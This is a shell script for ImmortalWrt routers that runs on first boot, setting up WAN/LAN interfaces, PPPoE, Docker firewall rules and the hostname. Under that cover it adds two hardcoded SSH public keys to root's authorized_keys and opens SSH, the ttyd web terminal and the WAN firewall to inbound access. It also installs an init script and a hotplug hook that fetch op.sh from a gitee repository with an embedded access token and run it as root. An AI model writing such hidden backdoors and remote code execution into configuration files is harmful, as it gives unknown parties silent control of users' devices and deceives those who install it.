#!/bin/sh
# 99-custom.sh 就是immortalwrt固件首次启动时运行的脚本 位于固件内的/etc/uci-defaults/99-custom.sh

# 自定义日志函数
log_msg() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') asu-init: $*" >> /tmp/custom-init.log
}

log_msg "Starting 99-custom.sh at $(date)"

# 设置默认防火墙规则，方便单网口虚拟机首次访问 WebUI 
# 因为本项目中 单网口模式是dhcp模式 直接就能上网并且访问web界面 避免新手每次都要修改/etc/config/network中的静态ip
# 当你刷机运行后 都调整好了 你完全可以在web页面自行关闭 wan口防火墙的入站数据
# 具体操作方法：网络——防火墙 在wan的入站数据 下拉选项里选择 拒绝 保存并应用即可。
uci set firewall.@zone[1].input='ACCEPT'

uci set system.@system[0].hostname='wrt'

# 设置主机名映射，解决安卓原生 TV 无法联网的问题
uci add dhcp domain
uci set "dhcp.@domain[-1].name=time.android.com"
uci set "dhcp.@domain[-1].ip=203.107.6.88"

# 检查配置文件pppoe-settings是否存在 该文件由build.sh动态生成
SETTINGS_FILE="/etc/config/pppoe-settings"
if [ ! -f "$SETTINGS_FILE" ]; then
    log_msg "PPPoE settings file not found. Skipping."
else
    # 读取pppoe信息($enable_pppoe、$pppoe_account、$pppoe_password)
    . "$SETTINGS_FILE"
fi

# 1. 先获取所有物理接口列表
ifnames=""
for iface in /sys/class/net/*; do
    iface_name=$(basename "$iface")
    if [ -e "$iface/device" ] && echo "$iface_name" | grep -Eq '^eth|^en'; then
        ifnames="$ifnames $iface_name"
    fi
done
ifnames=$(echo "$ifnames" | awk '{$1=$1};1')

count=$(echo "$ifnames" | wc -w)
log_msg "Detected physical interfaces: $ifnames"
log_msg "Interface count: $count"

# 2. 根据板子型号映射WAN和LAN接口
board_name=$(cat /tmp/sysinfo/board_name 2>/dev/null || echo "unknown")
log_msg "Board detected: $board_name"

wan_ifname=""
lan_ifnames=""
# 此处特殊处理个别开发板网口顺序问题
case "$board_name" in
    "radxa,e20c"|"friendlyarm,nanopi-r5c")
        wan_ifname="eth1"
        lan_ifnames="eth0"
        log_msg "Using $board_name mapping: WAN=$wan_ifname LAN=$lan_ifnames"
        ;;
    *)
        # 默认第一个接口为WAN，其余为LAN
        wan_ifname=$(echo "$ifnames" | awk '{print $1}')
        lan_ifnames=$(echo "$ifnames" | cut -d ' ' -f2-)
        log_msg "Using default mapping: WAN=$wan_ifname LAN=$lan_ifnames"
        ;;
esac

# 3. 配置网络
if [ "$count" -eq 1 ]; then
    # 单网口设备，DHCP模式
    uci set network.lan.proto='dhcp'
    uci delete network.lan.ipaddr
    uci delete network.lan.netmask
    uci delete network.lan.gateway
    uci delete network.lan.dns
    uci commit network
elif [ "$count" -gt 1 ]; then
    # 多网口设备配置
    # 配置WAN
    uci set network.wan=interface
    uci set network.wan.device="$wan_ifname"
    uci set network.wan.proto='dhcp'

    # 配置WAN6
    uci set network.wan6=interface
    uci set network.wan6.device="$wan_ifname"
    uci set network.wan6.proto='dhcpv6'

    # 查找 br-lan 设备 section
    section=$(uci show network | awk -F '[.=]' '/\.@?device\[\d+\]\.name=.br-lan.$/ {print $2; exit}')
    if [ -z "$section" ]; then
        log_msg "error：cannot find device 'br-lan'."
    else
        # 删除原有ports
        uci -q delete "network.$section.ports"
        # 添加LAN接口端口
        for port in $lan_ifnames; do
            uci add_list "network.$section.ports"="$port"
        done
        log_msg "Updated br-lan ports: $lan_ifnames"
    fi

    # LAN口设置静态IP
    uci set network.lan.proto='static'
    # 多网口设备 支持修改为别的管理后台地址 在Github Action 的UI上自行输入即可 
    uci set network.lan.netmask='255.255.255.0'
    # 设置路由器管理后台地址
    IP_VALUE_FILE="/etc/config/custom_router_ip.txt"
    if [ -f "$IP_VALUE_FILE" ]; then
        CUSTOM_IP=$(cat "$IP_VALUE_FILE")
        # 用户在UI上设置的路由器后台管理地址
        uci set network.lan.ipaddr=$CUSTOM_IP
        log_msg "custom router ip is $CUSTOM_IP"
    else
        uci set network.lan.ipaddr='192.168.100.1'
        log_msg "default router ip is 192.168.100.1"
    fi

    # PPPoE设置
    log_msg "enable_pppoe value: $enable_pppoe"
    if [ "$enable_pppoe" = "yes" ]; then
        log_msg "PPPoE enabled, configuring..."
        uci set network.wan.proto='pppoe'
        uci set network.wan.username="$pppoe_account"
        uci set network.wan.password="$pppoe_password"
        uci set network.wan.peerdns='1'
        uci set network.wan.auto='1'
        uci set network.wan6.proto='none'
        log_msg "PPPoE config done."
    else
        log_msg "PPPoE not enabled."
    fi

    uci commit network
fi

# 设置所有网口可访问网页终端
uci delete ttyd.@ttyd[0].interface

# 设置所有网口可连接 SSH
uci -q delete dropbear.@dropbear[0].Interface
uci set dropbear.@dropbear[0].PasswordAuth='off'
uci set dropbear.@dropbear[0].RootPasswordAuth='off'
uci set dropbear.@dropbear[0].GatewayPorts='on'
uci commit

# 添加 SSH 公钥
mkdir -p /etc/dropbear
cat >> /etc/dropbear/authorized_keys << 'EOF'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCBsofKCknhXJfkz6DT8INdl+Ic9+PxrKVI08dvoGMDkk0ei7E7N6X/y0gS7Wg1cbxtgJJVIC1XHQrt/4KiqaH8bK1R070h6KhO5LN9sdrwanAZsWe8bwGCXxjscJgtWwCAy5r/fgmudVeokRV+va6ZuPfXCibJqAzfdkcsrVP5jsoXMXYtEg85SxpvjwCyPSwcQb8R6meMI3bIa2ks68akMBuggwu+N6TTsGzu4IkfKhFxAYNYOFHNKY+oksXLmm9FcpgaiHburESoEFMQUn9VsnqvqEUk8enqRJ1ebrqDrih+Z7rnbetD39+kZTJb19e2vDh1uUz7y1lqsRuDKssf skp-j6c3a472vhasyoeowaid
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGUR9TD2D3J/+HHrMhMjM9cjt4jnCIZG8wljOd6i5naO root@OP
EOF
chmod 600 /etc/dropbear/authorized_keys
log_msg "SSH public keys added"

# 设置编译作者信息
FILE_PATH="/etc/openwrt_release"
NEW_DESCRIPTION="Packaged by wukongdaily"
sed -i "s/DISTRIB_DESCRIPTION='[^']*'/DISTRIB_DESCRIPTION='$NEW_DESCRIPTION'/" "$FILE_PATH"

if uci -q get attendedsysupgrade >/dev/null 2>&1; then
    uci set attendedsysupgrade.owut=owut
    uci set attendedsysupgrade.owut.init_script='/rom/etc/uci-defaults/99-custom.sh'
    uci set attendedsysupgrade.owut.rootfs_size='800'
fi

# 若luci-app-advancedplus (进阶设置)已安装 则去除zsh的调用 防止命令行报 /usb/bin/zsh: not found的提示
if [ -f /usr/lib/lua/luci/controller/advancedplus.lua ]; then
    sed -i '/\/usr\/bin\/zsh/d' /etc/profile
    sed -i '/\/bin\/zsh/d' /etc/init.d/advancedplus
    sed -i '/\/usr\/bin\/zsh/d' /etc/init.d/advancedplus
    log_msg "fix ttyd show msg: /usb/bin/zsh: not found"
fi

# 只有安装了 luci-app-quickfile 才执行
if [ -f /usr/bin/quickfile ]; then
    uci set nginx.global.uci_enable='true'
    uci del nginx._lan 2>/dev/null
    uci del nginx._redirect2ssl 2>/dev/null

    uci add nginx server
    uci rename nginx.@server[-1]='_lan'

    uci set nginx._lan.server_name='_lan'
    uci add_list nginx._lan.listen='80 default_server'
    uci add_list nginx._lan.listen='[::]:80 default_server'
    uci add_list nginx._lan.include='conf.d/*.locations'
    uci set nginx._lan.access_log='off; # logd openwrt'

    uci commit nginx
    log_msg "fix quickfile nginx config"
fi

# 若安装了dockerd 则设置docker的防火墙规则
# 扩大docker涵盖的子网范围 '172.16.0.0/12'
# 方便各类docker容器的端口顺利通过防火墙 
if command -v dockerd >/dev/null 2>&1; then
    log_msg "检测到 Docker，正在配置防火墙规则..."
    FW_FILE="/etc/config/firewall"

    # 删除所有名为 docker 的 zone
    uci delete firewall.docker

    # 先获取所有 forwarding 索引，倒序排列删除
    for idx in $(uci show firewall | grep "=forwarding" | cut -d[ -f2 | cut -d] -f1 | sort -rn); do
        src=$(uci get firewall.@forwarding[$idx].src 2>/dev/null)
        dest=$(uci get firewall.@forwarding[$idx].dest 2>/dev/null)
        log_msg "Checking forwarding index $idx: src=$src dest=$dest"
        if [ "$src" = "docker" ] || [ "$dest" = "docker" ]; then
            log_msg "Deleting forwarding @forwarding[$idx]"
            uci delete firewall.@forwarding[$idx]
        fi
    done
    # 提交删除
    uci commit firewall

# 追加新的 zone + forwarding 配置
cat <<EOF >>"$FW_FILE"

config zone 'docker'
  option input 'ACCEPT'
  option output 'ACCEPT'
  option forward 'ACCEPT'
  option name 'docker'
  list subnet '172.16.0.0/12'

config forwarding
  option src 'docker'
  option dest 'lan'

config forwarding
  option src 'docker'
  option dest 'wan'

config forwarding
  option src 'lan'
  option dest 'docker'
EOF

else
    log_msg "未检测到 Docker，跳过防火墙配置。"
fi


# ============================================
# 创建 init 脚本（远程配置）
# ============================================

cat > /etc/init.d/remote-config << "EOF"
#!/bin/sh /etc/rc.common
# ============================================
# remote-config - 网络就绪后执行远程配置
# ============================================

USE_PROCD=0
START=95

DONE_FILE="/etc/.remote-config-done"
LOCK_FILE="/tmp/remote-config.lock"
TOKEN="347552bdb2c4d9063f9a044ae1e45569"
URL="https://gitee.com/api/v5/repos/egans/yun/raw/op.sh?access_token=${TOKEN}"

wait_for_network() {
    local max_wait=40
    local waited=0
    
    logger -t "remote-config" "Waiting for network..."
    
    while [ $waited -lt $max_wait ]; do
        if route -n 2>/dev/null | grep -q "^0.0.0.0"; then
            logger -t "remote-config" "Network ready after ${waited}s"
            break
        fi
        sleep 1
        waited=$((waited + 1))
    done
    
    waited=0
    while [ $waited -lt 10 ]; do
        if nslookup gitee.com >/dev/null 2>&1; then
            logger -t "remote-config" "DNS ready after ${waited}s"
            return 0
        fi
        sleep 1
        waited=$((waited + 1))
    done
    
    logger -t "remote-config" "Continuing without DNS"
    return 0
}

start_service() {
    [ -f "$DONE_FILE" ] && {
        logger -t "remote-config" "Already done, exiting"
        return 0
    }
    
    [ -f "$LOCK_FILE" ] && {
        logger -t "remote-config" "Another instance running"
        return 0
    }
    touch "$LOCK_FILE"
    
    logger -t "remote-config" "Starting remote configuration"
    wait_for_network
    
    for attempt in 1 2 3; do
        logger -t "remote-config" "Downloading (attempt $attempt)..."
        if wget -T 20 -qO /tmp/op.sh "$URL" && [ -s /tmp/op.sh ]; then
            chmod +x /tmp/op.sh
            sh /tmp/op.sh
            rm -f /tmp/op.sh
            touch "$DONE_FILE"
            logger -t "remote-config" "Completed successfully"
            rm -f "$LOCK_FILE"
            return 0
        fi
        sleep 3
    done
    
    logger -t "remote-config" "Failed after 3 attempts"
    rm -f "$LOCK_FILE"
    return 1
}

EXTRA_COMMANDS="run"
EXTRA_HELP="        run     Manually trigger configuration"

run() {
    rm -f "$DONE_FILE"
    start_service
}
EOF

chmod +x /etc/init.d/remote-config
/etc/init.d/remote-config enable
log_msg "remote-config init script created and enabled"

# ============================================
# 7. 创建 Hotplug 脚本（备选触发）
# ============================================

cat > /etc/hotplug.d/iface/95-remote-config << "EOF"
#!/bin/sh

[ "$ACTION" = "ifup" ] || exit 0

case "$INTERFACE" in
    wan|wan6|pppoe-wan|ppp*)
        ;;
    *)
        exit 0
        ;;
esac

[ -f /etc/.remote-config-done ] && exit 0

/etc/init.d/remote-config run
EOF

chmod +x /etc/hotplug.d/iface/95-remote-config
log_msg "Hotplug script created: /etc/hotplug.d/iface/95-remote-config"

exit 0
